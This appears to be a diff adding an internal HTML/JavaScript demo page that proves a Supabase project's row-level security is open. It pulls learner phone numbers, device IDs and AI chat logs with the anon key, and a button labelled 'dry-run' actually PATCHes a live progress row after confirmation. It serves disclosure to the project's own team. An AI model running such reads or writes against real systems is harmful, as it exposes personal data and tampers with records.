@@ -1,0 +1,176 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Taksha Acharya — RLS Leak Demo (internal)</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    :root {
+      --paper: #FDFBF6; --cream: #F7F2E9; --ink: #1A2418; --muted: #8A8675;
+      --line: #E4DDCF; --forest: #264E2E; --terra: #B95D3E; --gold: #B5903A;
+    }
+    * { box-sizing: border-box; }
+    body {
+      font: 14px/1.5 system-ui, -apple-system, sans-serif;
+      background: var(--paper); color: var(--ink); margin: 0; padding: 24px;
+      max-width: 1100px; margin-inline: auto;
+    }
+    h1 { font-family: Georgia, serif; font-style: italic; margin: 0 0 4px; }
+    .kicker { font-family: ui-monospace, monospace; letter-spacing: 0.18em;
+      text-transform: uppercase; font-size: 10px; color: var(--terra); }
+    .warn {
+      background: #fff4ee; border-left: 4px solid var(--terra);
+      padding: 10px 14px; margin: 12px 0 24px; font-size: 13px;
+    }
+    fieldset {
+      background: white; border: 1px solid var(--line); border-radius: 12px;
+      padding: 14px 18px; margin-bottom: 16px;
+    }
+    legend { font-weight: 600; padding: 0 6px; color: var(--forest); }
+    label { display: block; font-size: 12px; color: var(--muted); margin-top: 8px; }
+    input {
+      width: 100%; padding: 8px 10px; border: 1px solid var(--line); border-radius: 8px;
+      font-family: ui-monospace, monospace; font-size: 12px; margin-top: 4px;
+    }
+    button {
+      background: var(--forest); color: var(--cream); border: 0; border-radius: 8px;
+      padding: 8px 14px; font-weight: 600; cursor: pointer; font-size: 13px;
+      margin: 6px 6px 0 0;
+    }
+    button.danger { background: var(--terra); }
+    button:hover { filter: brightness(0.95); }
+    pre {
+      background: #1a2418; color: #e8f5e9; padding: 12px; border-radius: 8px;
+      font-size: 11.5px; overflow: auto; max-height: 280px; white-space: pre-wrap;
+      word-break: break-word;
+    }
+    .row { display: flex; gap: 12px; align-items: end; flex-wrap: wrap; }
+    .chip {
+      display: inline-block; font-family: ui-monospace, monospace; font-size: 10px;
+      letter-spacing: 0.14em; text-transform: uppercase; background: var(--cream);
+      border: 1px solid var(--line); border-radius: 999px; padding: 3px 10px; color: var(--muted);
+    }
+    h2 { font-size: 15px; margin: 16px 0 8px; color: var(--forest); }
+  </style>
+</head>
+<body>
+  <div class="kicker">Internal · Security Demo · RLS</div>
+  <h1>What the anon key can currently read</h1>
+  <p style="color:var(--muted);margin-top:0">
+    Paste your project URL and the anon key (see README for where to find them in DevTools), click
+    each button, and watch the console-style output show the data that any end-user of the app
+    can already read with their own browser.
+  </p>
+
+  <div class="warn">
+    <strong>⚠ Run only against your own project.</strong> This only reproduces what a user with
+    the live app open is already authorized to do — we're just making it visible.
+  </div>
+
+  <fieldset>
+    <legend>Project</legend>
+    <label>Supabase URL
+      <input id="url" placeholder="https://xxxxxxxxxxxxxxxxxxxx.supabase.co"
+             value="https://jzrsnfpgydiaoeiijypm.supabase.co" />
+    </label>
+    <label>Anon key (copy the <code>apikey</code> request header from DevTools → Network)
+      <input id="key" type="password" placeholder="eyJhbGciOi…" />
+    </label>
+    <div class="row" style="margin-top:10px">
+      <button data-action="learners">Read <span class="chip">taksha_learners</span></button>
+      <button data-action="chat">Read <span class="chip">taksha_chat_logs</span></button>
+      <button data-action="quiz">Read <span class="chip">taksha_quiz_attempts</span></button>
+      <button data-action="progress">Read <span class="chip">taksha_progress</span></button>
+      <button data-action="apply">Read <span class="chip">taksha_apply_logs</span></button>
+      <button data-action="events">Read <span class="chip">taksha_events</span></button>
+      <button data-action="all">Read ALL</button>
+    </div>
+  </fieldset>
+
+  <fieldset>
+    <legend>Proof of write access</legend>
+    <p style="color:var(--muted);font-size:12px;margin-top:0">
+      Demonstrates that any user can also tamper with data. Reads one learner's progress, then
+      offers to UPDATE <code>completed=true</code> on it. Paste it back if this is prod.
+    </p>
+    <div class="row">
+      <button data-action="tamper" class="danger">Show UPDATE access (dry-run)</button>
+    </div>
+  </fieldset>
+
+  <h2>Output</h2>
+  <pre id="out">Paste URL + key, then click a button.</pre>
+
+<script>
+const $ = (id) => document.getElementById(id);
+const out = $("out");
+
+function log(label, data) {
+  const head = `\n▸ ${label}\n`;
+  const body = typeof data === 'string' ? data : JSON.stringify(data, null, 2);
+  out.textContent += head + body + '\n';
+  out.scrollTop = out.scrollHeight;
+}
+function clearOut() { out.textContent = ''; }
+
+function headers() {
+  const key = $("key").value.trim();
+  if (!key) throw new Error("Paste the anon key first.");
+  return { apikey: key, Authorization: `Bearer ${key}` };
+}
+async function read(table, select, limit = 10) {
+  const base = $("url").value.replace(/\/+$/, '');
+  const u = `${base}/rest/v1/${table}?select=${encodeURIComponent(select)}&limit=${limit}`;
+  const r = await fetch(u, { headers: headers() });
+  const body = await r.json();
+  return { status: r.status, count: Array.isArray(body) ? body.length : 0, body };
+}
+
+const READERS = {
+  learners: () => read('taksha_learners', 'id,device_id,phone,preferred_lang,last_seen', 10),
+  chat:     () => read('taksha_chat_logs', 'learner_id,lang,user_message,ai_response,created_at', 10),
+  quiz:     () => read('taksha_quiz_attempts', 'learner_id,module_id,score,total,created_at', 10),
+  progress: () => read('taksha_progress', 'learner_id,module_id,sections_completed,completed', 10),
+  apply:    () => read('taksha_apply_logs', 'learner_id,module_id,data,created_at', 10),
+  events:   () => read('taksha_events', 'learner_id,event_type,event_data,created_at', 10),
+};
+
+document.addEventListener('click', async (e) => {
+  const btn = e.target.closest('button[data-action]');
+  if (!btn) return;
+  const action = btn.dataset.action;
+  try {
+    if (action === 'all') {
+      clearOut();
+      for (const k of Object.keys(READERS)) log(k, await READERS[k]());
+      return;
+    }
+    if (action === 'tamper') {
+      clearOut();
+      const p = await READERS.progress();
+      log('progress (sample row)', p.body?.[0] || '(empty)');
+      const row = p.body?.[0];
+      if (!row) return log('tamper', 'No progress rows to tamper with.');
+      const base = $("url").value.replace(/\/+$/, '');
+      const url = `${base}/rest/v1/taksha_progress?learner_id=eq.${row.learner_id}&module_id=eq.${encodeURIComponent(row.module_id)}`;
+      const ok = confirm(`About to attempt UPDATE on progress row (learner=${row.learner_id.slice(0,8)}…, module=${row.module_id}). This WILL modify live data. Proceed?`);
+      if (!ok) return log('tamper', 'Cancelled — no write performed. (The FACT that you could is the point.)');
+      const r = await fetch(url, {
+        method: 'PATCH',
+        headers: { ...headers(), 'Content-Type': 'application/json', Prefer: 'return=representation' },
+        body: JSON.stringify({ completed: !row.completed }),
+      });
+      log('tamper result', { status: r.status, body: await r.json() });
+      return;
+    }
+    if (READERS[action]) {
+      clearOut();
+      log(action, await READERS[action]());
+    }
+  } catch (err) {
+    log('error', String(err));
+  }
+});
+</script>
+</body>
+</html>
